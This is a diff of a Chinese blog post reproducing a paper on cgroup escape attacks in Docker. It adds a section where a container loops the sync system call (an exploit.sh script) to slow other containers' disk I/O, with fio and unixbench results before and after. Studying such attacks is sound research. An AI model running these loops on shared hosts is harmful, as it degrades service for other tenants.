@@ -6,9 +6,9 @@ description: a recurrent of the cgroup escaping paper
 keywords: cgroup, Docker, Linux container
 ---
 
-## Linux Control Groups Escaping - Houdini
+# Linux Control Groups Escaping - Houdini
 
-### Introduction
+## Introduction
 
 Linux Control Group，也称为 cgroups，是用于监控、限制 process 资源的一种 Linux kernel feature[^note1]。它同时也时操作系统级别容器化的重要组成模块。它将进程划分到多个分层的组，同时为这些组提供资源控制器，从而管理 CPU，内存还有块设备的输入输出。当创建子进程的时候，该子进程会自动从他的创建者那里拷贝 cgroup 属性，从而强制实行资源控制。然而，在创建进程的时候从父进程继承 cgroup 约束并不是万无一失的，有时候一致性和资源合理分配并不能很好的保持。
 
@@ -16,7 +16,7 @@ Linux Control Group，也称为 cgroups，是用于监控、限制 process 资�
 
 论文主要针对之前提到的子进程 cgroup 进行攻击，使得该子进程脱离父进程的 cgroup 类别，从而进行 ou-of-band 攻击，使得同一物理机上的其他 container 的运行受到影响，同时还可以获得更多的资源（超出它本应该获得的范围）。我撰写该 blog 的目的是在于复现该论文的 esacape 方法，同时总结这些方法的特性和推广的价值。
 
-### Cgroups Hierarchy and Controllers
+## Cgroups Hierarchy and Controllers
 
 > In Linux, cgroups are organized in a hierarchical structure where a set of cgroups are arranged in a tree. Each task (e.g., a thread) can only be associated with exactly one cgroup in one hierarchy, but can be a member of multiple cgroups in different hierarchies. Each hierarchy then has one or more subsystems attached to it, so that a resource controller can apply per-cgroup limits on specific system resources. With the hierarchical structure, the cgroups mechanism is able to limit the total amount of resources for a group of processes(e.g., a container).
 
@@ -38,7 +38,7 @@ Cgroup 相关的 resource controller 一共有四种
 
 
 
-### Cgroups Inheritance
+## Cgroups Inheritance
 
 > One important feature of cgroups is that child processes inherit cgroups attributes from their parent processes. 
 
@@ -52,11 +52,11 @@ Cgroup 相关的 resource controller 一共有四种
 
 
 
-### Exploiting Strategies
+## Exploiting Strategies
 
 
 
-### Cases Reccurent
+## Cases Reccurent
 
 > We use the Docker container to set the configuration of cgroups through the provided interfaces. Besides, Docker also ensures that containers are isolated through namespaces bydefault. 
 >
@@ -64,15 +64,15 @@ Cgroup 相关的 resource controller 一共有四种
 
 
 
-#### Case 1: Exception Handling
+### Case 1: Exception Handling
 
-##### constrains
+#### constrains
 
 * cpu core: 1
 * cpu share: 100%, 10%, 5%
 * pid limitation: None, 100, 50
 
-##### method
+#### method
 
 首先确保安装了 docker[^note4] 并且下载了 ubuntu 镜像。若没有下载，在第一次运行该镜像时会自动下载。
 
@@ -175,7 +175,7 @@ nifty_gauss     10.66%      10.5MiB / 15.46GiB    0.07%         50
 
 
 
-##### Different Cpu Share & PID Limitation
+#### Different Cpu Share & PID Limitation
 
 
 
@@ -294,7 +294,7 @@ if (option && typeof option === "object") {
 
 
 
-##### DoS Attack
+#### DoS Attack
 
 由于 sysbench 需要在容器当中使用，所以可以创建一个新的 image 然后保存它，之后每次都可以用这个 image 来实验，因为 sysbench 要用好几次。
 
@@ -475,21 +475,136 @@ if (option && typeof option === "object") {
 
 
 
-#### Case 2: Data Synchronization
+### Case 2: Data Synchronization
+
+这一节关注的是 Linux 关于文件读写的漏洞。在进程对文件进行读写的时候，为了加快写操作的速度，系统采用了 [lazy disk writeback mechanism](https://en.wikipedia.org/wiki/Cache_(computing)) 来实现异步的往 disk 中写入 updated 的数据。对于 container 来说，它被允许调用一系列关于文件同步即 push Linux kernel 进行数据同步的[系统调用](https://github.com/moby/moby/blob/a30990b3c8d0d42280fa501287859e1d2393a951/profiles/seccomp/default.json#L333)，比如 sync，syncfs 还有 fsync 等。
+
+论文提出 sync 系统调用可以用来降低 system-wide I/O performance，进行 resource-freeing attack 以及建立 convert channel。当然，**只有当前系统当中存在 write 行为的时候**，sync 相关的 attack 才有用武之地。
+
+#### Slow down system-wide I/O performance
+
+这个实验中，依旧是 2 个 containers，一个循环调用 sync() system call。另一个 victim container 中运行 [FIO benchmark](https://github.com/axboe/fio) 来检测 I/O performance，运行 [Unix benchmark](https://github.com/kdlucas/byte-unixbench) 来检测体统性能的变化。
+
+```shell
+$ docker run --cpuset-cpus="0" -v /home/zty/dev/byte-unixbench/:/unix-bench -v /home/zty/dev/fio:/fio --rm -it tianyu/ubuntu:v2
+```
+
+**baseline**
+
+**fio benchmark**
+
+参考
+
+[使用fio测试磁盘I/O性能](https://segmentfault.com/a/1190000003880571)
+
+[fio 命令入门到跑路](https://blog.51cto.com/shaonian/2319175 )
+
+```
+# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=read -bs=4k -size=10M -numjobs=16 -runtime=100 -group_reporting
+bw (  KiB/s): min=16544, max=46956, per=100.00%, avg=39513.48, stdev=585.67, samples=127
+iops        : min= 4136, max=11738, avg=9877.77, stdev=146.40, samples=127
+
+# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=write -bs=4k -size=10M -numjobs=16 -runtime=100 -group_reporting
+bw (  KiB/s): min= 3271, max=22178, per=100.00%, avg=15604.92, stdev=320.26, samples=333
+iops        : min=  817, max= 5544, avg=3900.79, stdev=80.07, samples=333
+
+# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=randread -bs=4k -size=10M -numjobs=16 -runtime=100 -group_reporting
+bw (  KiB/s): min=  270, max= 7788, per=99.90%, avg=1658.39, stdev=60.54, samples=3034
+iops        : min=   66, max= 1942, avg=413.21, stdev=15.11, samples=3034
+
+# fio -directory=/data/ -name=tempfile.dat -direct=1 -rw=randwrite -bs=4k -size=10M -numjobs=16 -runtime=100 -group_reporting
+bw (  KiB/s): min=  124, max= 2304, per=99.91%, avg=1083.98, stdev=25.23, samples=3200
+iops        : min=   28, max=  576, avg=270.17, stdev= 6.31, samples=3200
+```
+
+> 测试结果如上，主要关注bw和iops结果
+
+bw：磁盘的吞吐量，这个是顺序读写考察的重点 
+
+iops：磁盘的每秒读写次数，这个是随机读写考察的重点
+
+**unixbench**
+
+参考
+
+[官方 usage 文档](https://github.com/kdlucas/byte-unixbench/blob/master/UnixBench/USAGE)
+
+```shell
+# ./Run execl fsdisk pipe spawn shell1
+System Benchmarks Index Values               BASELINE       RESULT    INDEX
+Execl Throughput                                 43.0       6388.6   1485.7
+File Copy 4096 bufsize 8000 maxblocks          5800.0    2444771.8   4215.1
+Pipe Throughput                               12440.0    1053247.2    846.7
+Process Creation                                126.0      14864.3   1179.7
+Shell Scripts (1 concurrent)                     42.4      13092.6   3087.9
+```
+
+
+
+**DOS**
+
+```shell
+$ docker run --cpuset-cpus="5" -v /home/zty/dev/cfile:/cfile --rm -it ubuntu
+# cat /cfile/exploit.sh 
+#!/bin/bash
+while true
+do
+	sync
+done
+# /cfile/exploit.sh 
+```
+
+
+
+**fio**
+
+```
+read
+bw (  KiB/s): min= 4719, max=44356, per=100.00%, avg=23270.86, stdev=781.80, samples=211
+iops        : min= 1179, max=11088, avg=5817.21, stdev=195.46, samples=211
+
+write
+bw (  KiB/s): min=  388, max= 1462, per=99.91%, avg=836.21, stdev=12.77, samples=3200
+iops        : min=   94, max=  364, avg=208.22, stdev= 3.20, samples=3200
+
+randread
+bw (  KiB/s): min=  462, max= 1648, per=99.92%, avg=1110.15, stdev=13.74, samples=3200
+iops        : min=  114, max=  412, avg=276.75, stdev= 3.44, samples=3200
+
+randwrite
+bw (  KiB/s): min=  261, max= 1096, per=99.93%, avg=666.52, stdev=10.12, samples=3200
+iops        : min=   63, max=  274, avg=165.91, stdev= 2.54, samples=3200
+```
+
+
+
+**unixbench**
+
+```
+# ./Run execl fsdisk pipe spawn shell1
+System Benchmarks Partial Index              BASELINE       RESULT    INDEX
+Execl Throughput                                 43.0       6146.8   1429.5
+File Copy 4096 bufsize 8000 maxblocks          5800.0    2251578.5   3882.0
+Pipe Throughput                               12440.0    1024852.2    823.8
+Process Creation                                126.0      14396.9   1142.6
+Shell Scripts (1 concurrent)                     42.4      12914.4   3045.8
+```
 
 
 
 
 
-#### Case 3
-
-#### Case 4
-
-#### Case 5
 
 
+### Case 3
 
-### References
+### Case 4
+
+### Case 5
+
+
+
+## References
 
 [^note1]:  cgroup man page: http://man7.org/linux/man-pages/man7/cgroups.7.html.
 
